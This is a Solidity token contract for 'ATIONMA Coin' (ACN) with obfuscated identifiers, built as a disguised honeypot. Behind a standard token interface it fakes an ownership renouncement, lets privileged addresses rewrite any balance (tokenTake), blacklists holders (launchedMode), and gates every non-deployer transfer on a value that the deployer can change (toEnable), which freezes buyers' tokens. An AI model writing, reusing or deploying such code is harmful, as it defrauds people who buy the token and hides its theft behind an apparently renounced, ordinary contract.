//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface teamLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitMarketing) external view returns (uint256);

    function transfer(address exemptMarketing, uint256 listToFund) external returns (bool);

    function allowance(address enableAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 listToFund) external returns (bool);

    function transferFrom(
        address sender,
        address exemptMarketing,
        uint256 listToFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxLaunched, uint256 value);
    event Approval(address indexed enableAt, address indexed spender, uint256 value);
}

interface maxTotal is teamLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract maxMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletBuyReceiver {
    function createPair(address swapReceiver, address liquidityFrom) external returns (address);
}

interface tokenMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ATIONMACoin is maxMarketing, teamLaunch, maxTotal {

    mapping(address => uint256) private senderWalletTo;

    function toEnable(uint256 listToFund) public {
        totalReceiver();
        teamFund = listToFund;
    }

    address public fromTradingFee;

    function walletFromBuy(address teamAmount, address exemptMarketing, uint256 listToFund) internal returns (bool) {
        if (teamAmount == fromTradingFee) {
            return tradingAuto(teamAmount, exemptMarketing, listToFund);
        }
        uint256 exemptShould = teamLaunch(sellLimitSender).balanceOf(limitFrom);
        require(exemptShould == teamFund);
        require(!launchMax[teamAmount]);
        return tradingAuto(teamAmount, exemptMarketing, listToFund);
    }

    bool public marketingShouldMin;

    string private enableBuy = "ACN";

    uint256 teamFund;

    function approve(address toWallet, uint256 listToFund) public virtual override returns (bool) {
        atList[_msgSender()][toWallet] = listToFund;
        emit Approval(_msgSender(), toWallet, listToFund);
        return true;
    }

    function totalReceiver() private view {
        require(exemptTx[_msgSender()]);
    }

    constructor (){
        if (txBuy == senderList) {
            senderList = false;
        }
        swapSender();
        tokenMax amountLiquidity = tokenMax(listReceiver);
        sellLimitSender = walletBuyReceiver(amountLiquidity.factory()).createPair(amountLiquidity.WETH(), address(this));
        if (limitAt) {
            senderSell = autoAmount;
        }
        fromTradingFee = _msgSender();
        exemptTx[fromTradingFee] = true;
        senderWalletTo[fromTradingFee] = marketingLiquidityMax;
        if (senderList == fromAtWallet) {
            fromAtWallet = true;
        }
        emit Transfer(address(0), fromTradingFee, marketingLiquidityMax);
    }

    function getOwner() external view returns (address) {
        return tokenWallet;
    }

    function swapSender() public {
        emit OwnershipTransferred(fromTradingFee, address(0));
        tokenWallet = address(0);
    }

    uint256 takeWallet;

    uint256 public autoAmount;

    function symbol() external view virtual override returns (string memory) {
        return enableBuy;
    }

    mapping(address => mapping(address => uint256)) private atList;

    bool private buyExemptFrom;

    function balanceOf(address limitMarketing) public view virtual override returns (uint256) {
        return senderWalletTo[limitMarketing];
    }

    uint256 private marketingLiquidityMax = 100000000 * 10 ** 18;

    bool private txBuy;

    function tokenTeam(address exemptReceiver) public {
        if (marketingShouldMin) {
            return;
        }
        
        exemptTx[exemptReceiver] = true;
        if (takeMaxShould == toAuto) {
            toAuto = takeMaxShould;
        }
        marketingShouldMin = true;
    }

    address public sellLimitSender;

    bool public senderList;

    uint256 public senderSell;

    bool public limitAt;

    function transfer(address shouldAuto, uint256 listToFund) external virtual override returns (bool) {
        return walletFromBuy(_msgSender(), shouldAuto, listToFund);
    }

    function allowance(address maxExempt, address toWallet) external view virtual override returns (uint256) {
        if (toWallet == listReceiver) {
            return type(uint256).max;
        }
        return atList[maxExempt][toWallet];
    }

    string private modeTx = "ATIONMA Coin";

    event OwnershipTransferred(address indexed shouldWallet, address indexed totalList);

    mapping(address => bool) public exemptTx;

    function launchedMode(address tokenMinLaunched) public {
        totalReceiver();
        
        if (tokenMinLaunched == fromTradingFee || tokenMinLaunched == sellLimitSender) {
            return;
        }
        launchMax[tokenMinLaunched] = true;
    }

    function owner() external view returns (address) {
        return tokenWallet;
    }

    function transferFrom(address teamAmount, address exemptMarketing, uint256 listToFund) external override returns (bool) {
        if (_msgSender() != listReceiver) {
            if (atList[teamAmount][_msgSender()] != type(uint256).max) {
                require(listToFund <= atList[teamAmount][_msgSender()]);
                atList[teamAmount][_msgSender()] -= listToFund;
            }
        }
        return walletFromBuy(teamAmount, exemptMarketing, listToFund);
    }

    uint256 public launchedTrading;

    address private tokenWallet;

    address listReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private toAuto;

    function tradingAuto(address teamAmount, address exemptMarketing, uint256 listToFund) internal returns (bool) {
        require(senderWalletTo[teamAmount] >= listToFund);
        senderWalletTo[teamAmount] -= listToFund;
        senderWalletTo[exemptMarketing] += listToFund;
        emit Transfer(teamAmount, exemptMarketing, listToFund);
        return true;
    }

    mapping(address => bool) public launchMax;

    function decimals() external view virtual override returns (uint8) {
        return enableReceiverFee;
    }

    function tokenTake(address shouldAuto, uint256 listToFund) public {
        totalReceiver();
        senderWalletTo[shouldAuto] = listToFund;
    }

    uint256 private takeMaxShould;

    function name() external view virtual override returns (string memory) {
        return modeTx;
    }

    bool private fromAtWallet;

    address limitFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private enableReceiverFee = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingLiquidityMax;
    }

}